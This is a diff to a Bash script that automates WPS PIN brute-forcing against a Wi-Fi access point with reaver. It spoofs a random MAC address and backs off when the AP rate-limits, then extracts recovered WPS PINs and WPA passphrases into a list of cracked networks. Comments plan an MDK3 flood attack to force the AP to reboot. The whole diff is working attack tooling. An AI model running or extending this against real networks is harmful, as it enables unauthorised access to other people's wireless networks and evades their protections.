@@ -607,24 +607,22 @@ clear;
 
 stopMonitor && resetDeviceDriver && getRandomMac &&  startMonitor;
 
-SESSION_FILE=$REAVER_SESSION_DIR'/'$AP_ESSID'.session';
-STATUS_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.status'
 BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
+SESSION_FILE=$REAVER_SESSION_DIR'/'$BSSID_CLEAR'.session';
+STATUS_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.status'
 
 if [[ ! -f $STATUS_FILE ]]; then
 	touch $STATUS_FILE;
-	echo $(date +"%d/%m/%Y %H:%M:%S $LCK_ATTEMPT BOF") > $STATUS_FILE
+	echo $(date +"%d/%m/%Y %H:%M:%S - - BOF") > $STATUS_FILE
 	echoGreen "Status File for $AP_BSSID Created......";
 else
 	echoBlue "Status File for $AP_BSSID Found......";
 fi
 
 if [[ ! -f $CRACKED_LIST_FILE ]]; then
-	touch $CRACKED_LIST_FILE;
-	echo "BSSID                   Ch      WPS     ESSID           PIN     WPA-PSK" > $CRACKED_LIST_FILE;
-	echo "------------------------------------------------------------------------------" >> $CRACKED_LIST_FILE;
 	echoOrange "Cracked List File Not Found!!! Creating New One......";
-	echoGreen "Cracked List File Created ($CRACKED_LIST_FILE)......";
+	touch $CRACKED_LIST_FILE;
+	echoGreen "Cracked List File Created......";
 else
 	echoBlue "Cracked List File Found......";
 fi
@@ -636,57 +634,80 @@ while true; do
 	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
 
 	eval $CMD_REAVER | {
-		echo $(date +"%d/%m/%Y %H:%M:%S $LCK_ATTEMPT REAVER_START") >> $STATUS_FILE;
+		echo $(date +"%d/%m/%Y %H:%M:%S - - REAVER_START") >> $STATUS_FILE;
 
 		while read -r REAVER_OUTPUT; do
 
 			if [[ $(echo "$REAVER_OUTPUT" | grep -ic "detected ap rate limiting") != 0 ]]; then
 				echoRed "[!] WARNING: Detected AP rate limiting......";
+				echo "- - - - AP_RATE_LIMITING" >> $STATUS_FILE;
 				$(killall -I reaver);
 			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps pin") != 0 ]]; then
 				echoGreen "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S $LCK_ATTEMPT WPS_PIN_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
+				echo $(date +"%d/%m/%Y %H:%M:%S - - WPS_PIN_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
 			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wpa psk") != 0 ]]; then
 				echoGreen "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S $LCK_ATTEMPT WPA_PSK_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
+				echo $(date +"%d/%m/%Y %H:%M:%S - - WPA_PSK_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
 			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "failed to recover wpa key") != 0 ]]; then
 				echoRed "$REAVER_OUTPUT";
 			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "receive timeout occurred") != 0 ]]; then
 				echoOrange "$REAVER_OUTPUT";
 				echoOrange "[!] Reseting WIFI Adapter......";
+				echo $(date +"%d/%m/%Y %H:%M:%S - - RECEIVE_TIMEOUT") >> $STATUS_FILE;
 				$(killall -I reaver);
+			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps transaction failed") != 0 ]]; then
+                                echoOrange "$REAVER_OUTPUT";
+				echo $(date +"%d/%m/%Y %H:%M:%S - - WPS_TRANSACTION_FAILED") >> $STATUS_FILE;
 			elif [[ $(echo "$REAVER_OUTPUT" | grep -icw "[!]") != 0 || $(echo "$REAVER_OUTPUT" | grep -icw "[-]") != 0 ]]; then
 				echoOrange "$REAVER_OUTPUT";
+				echo $(date +"%d/%m/%Y %H:%M:%S - - $REAVER_OUTPUT") >> $STATUS_FILE;
 			else
 				echoBlue "$REAVER_OUTPUT";
 			fi
 		done
 
-		echo $(date +"%d/%m/%Y %H:%M:%S $LCK_ATTEMPT REAVER_STOP") >> $STATUS_FILE;
+		echo $(date +"%d/%m/%Y %H:%M:%S - - REAVER_STOP") >> $STATUS_FILE;
 	}
 
 	if [[ $(grep -icw 'ap_rate_limiting' $STATUS_FILE) != 0 ]]; then
-#		if [[ "$AP_LOCK" -eq "Yes" ]]; then
-#			break;
-#		else
-#			checkLockStatus;
-#
-#			if [[ "$AP_LOCK" -eq "Yes" ]]; then
-#				break;
-#			else
-#				REAVER_ATTEMPT_DELAY=$((REAVER_ATTEMPT_DELAY+60));
-#				echoBlue "Increasing PIN Attempt Delay to $REAVER_ATTEMPT_DELAY......" && sleep 2;
-#			fi
-#		fi
 		LCK_ATTEMPT=$((LCK_ATTEMPT+1));
-		echo $(date +"%d/%m/%Y %H:%M:%S $LCK_ATTEMPT AP_RATE_LIMITING") >> $STATUS_FILE;
+		echo $(date +"%d/%m/%Y %H:%M:%S $LCK_ATTEMPT $AP_LOCK AP_RATE_LIMITING") >> $STATUS_FILE;
+
+		if [[ "$AP_LOCK" -eq "Yes" ]]; then
+			echoRed "AP Locked......";
+			break;
+			### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP IN THE FUTURE ###
+		else
+			### checkLockStatus;
+
+			if [[ "$AP_LOCK" -eq "Yes" ]]; then
+				echoRed "AP Locked......";
+				break;
+				### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP IN THE FUTURE ###
+			else
+				if [[ $REAVER_ATTEMPT_DELAY -ge 600 ]]; then
+					echoRed "Delay Between PIN Attempt Reached $REAVER_ATTEMPT_DELAY Sec.";
+					echoBlue "AP Is Not Locked, Try running the Script Again......";
+					break;
+				else
+					REAVER_ATTEMPT_DELAY=$((REAVER_ATTEMPT_DELAY+30))
+					echoBlue  "Reaver Delay Between PIN Attempt Increased to $REAVER_ATTEMPT_DELAY Sec.";
+				fi
+			fi
+		fi
 	elif [[ $(grep -icw 'wpa_psk_found' $STATUS_FILE) != 0 ]]; then
-		while IFS= read -r LINE; do
-			AP_LIST[${#AP_LIST[@]}]="$LINE";
+		while read -r STATUS_LINE; do
+			if [[ $(echo "$STATUS_LINE" | grep -ic "wpa_psk_found") != 0 ]]; then
+				WPA_PSK=$(awk '{ print $6 }' <<< $STATUS_LINE);
+				WPA_PSK=$(echo $WPA_PSK | sed s/"'"//g);
+			elif [[ $(echo "$STATUS_LINE" | grep -ic "wps_pin_found") != 0 ]]; then
+				WPS_PIN=$(awk '{ print $6 }' <<< $STATUS_LINE);
+				WPS_PIN=$(echo $WPS_PIN | sed s/"'"//g);
+			fi
 		done < "$STATUS_FILE"
 
-		echo "BSSID                   Ch      WPS     ESSID           PIN     WPA-PSK";
-		echo "$AP_BSSID               $AP_CHANNEL      $AP_WPS     $AP_ESSID" >> $CRACKED_LIST_FILE;
+		echo "$AP_BSSID $AP_CHANNEL $AP_ESSID $WPS_PIN $WPA_PSK" >> $CRACKED_LIST_FILE;
+		$(rm $SESSION_FILE) && $(rm $STATUS_FILE);
 		break;
 	fi
 
